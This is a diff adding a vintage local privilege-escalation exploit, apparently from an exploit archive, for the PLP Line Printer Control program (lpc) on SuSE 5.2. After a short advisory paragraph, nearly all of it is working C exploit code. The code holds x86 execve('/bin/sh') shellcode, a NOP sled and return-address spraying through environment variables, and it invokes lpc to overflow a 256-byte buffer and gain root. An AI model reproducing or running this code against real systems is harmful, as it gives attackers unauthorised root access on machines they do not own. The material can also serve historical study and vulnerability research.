@@ -1,0 +1,126 @@
+source: http://www.securityfocus.com/bid/328/info
+
+
+The PLP Line Printer Control program, shipped with S.u.S.E. 5.2 is vulnerable to a local remote buffer overflow. You can determine whether you're vulnerable or not by typing 'lpc'. If you're presented with an lpc version number, you're vulnerable. The consequences of lpc exploitation are root access for a local user. 
+
+/*
+
+Standard overflow for x86 linux lpc. PLP Line Printer Control program, version 4.0.3. Tested on SuSE 5.2 (suidroot). Test your copy of /usr/bin/lpc by trying an /usr/bin/lpc attach lp `perl -e "print 'A' x 1000"`;lpc status lp The problematic code is in displayq.c and control_ops.c, where we attempt to fscanf() the lockfile's contents into a fixed length buffer. See the Bugtraq post for full fix information(www.geek-girl.com/bugtraq).
+
+The buffer we're overflowing is 256bytes, and an offset of 0 works just fine. Try in increments of +-100 if it doesn't work for you.
+
+Obviously this is a complete rip of Aleph1's standard overflow program from his paper "smashing the stack for fun and profit".
+
+to compile: gcc -o xnec_lpc xnec_lpc.c
+
+bugs: only sets uid=0, and you may have to have a printer defined (lp on my box).
+
+greets to #sk1llz
+
+-xnec xnec on EF and DALnet, xnec@inferno.tusculum.edu
+
+*/ #include <stdlib.h>
+
+#define DEFAULT_OFFSET 0
+
+#define DEFAULT_BUFFER_SIZE 356
+
+#define DEFAULT_EGG_SIZE 2048
+
+#define NOP 0x90
+
+char pause;
+
+char shellcode[] =
+
+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+
+"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+
+"\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long get_esp(void) {
+
+__asm__("movl %esp,%eax");
+
+}
+
+void main(int argc, char *argv[]) {
+
+char *buff, *ptr, *egg;
+
+long *addr_ptr, addr;
+
+int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+
+int i, eggsize=DEFAULT_EGG_SIZE;
+
+if (argc > 1) bsize = atoi(argv[1]);
+
+if (argc > 2) offset = atoi(argv[2]);
+
+if (argc > 3) eggsize = atoi(argv[3]);
+
+if (!(buff = malloc(bsize))) {
+
+printf("Can't allocate memory.\n");
+
+exit(0);
+
+}
+
+if (!(egg = malloc(eggsize))) {
+
+printf("Can't allocate memory.\n");
+
+exit(0);
+
+}
+
+addr = get_esp() - offset;
+
+printf("Using address: 0x%x\n", addr);
+
+printf("\nPLP Line Printer Control program, version 4.0.3 overflow.\n");
+
+printf("Bug found by xnec, code ripped from Aleph1. After running this program, simply compile and run:\n---\n
+
+#include <unistd.h>
+
+void main(){system(\"/bin/bash\");}\n---\n");
+
+scanf("%c", pause);
+
+ptr = buff;
+
+addr_ptr = (long *) ptr;
+
+for (i = 0; i < bsize; i+=4)
+
+*(addr_ptr++) = addr;
+
+ptr = egg;
+
+for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+
+*(ptr++) = NOP;
+
+for (i = 0; i < strlen(shellcode); i++)
+
+*(ptr++) = shellcode[i];
+
+buff[bsize - 1] = '\0';
+
+egg[eggsize - 1] = '\0';
+
+memcpy(egg,"EGG=",4);
+
+putenv(egg);
+
+memcpy(buff,"RET=",4);
+
+putenv(buff);
+
+system("`which lpc` attach lp $RET; `which lpc` status lp");
+
+} 
